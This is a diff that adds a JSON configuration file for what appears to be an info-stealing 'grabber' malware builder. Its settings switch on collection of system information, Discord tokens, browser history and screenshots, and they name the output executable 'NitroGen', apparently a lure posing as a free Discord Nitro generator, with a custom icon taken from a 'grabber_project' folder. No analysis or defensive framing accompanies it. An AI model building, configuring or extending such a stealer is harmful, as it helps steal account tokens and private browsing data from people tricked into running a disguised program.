@@ -1,0 +1,9 @@
+{
+  "collect_system_info": true,
+  "collect_discord_token": true,
+  "collect_browser_history": true,
+  "collect_screenshot": true,
+  "save_screenshot_locally": false,
+  "executable_name": "NitroGen",
+  "icon_path": "C:\\Users\\splexdev\\Documents\\grabber_project\\icons\\custom_icon.ico"
+}
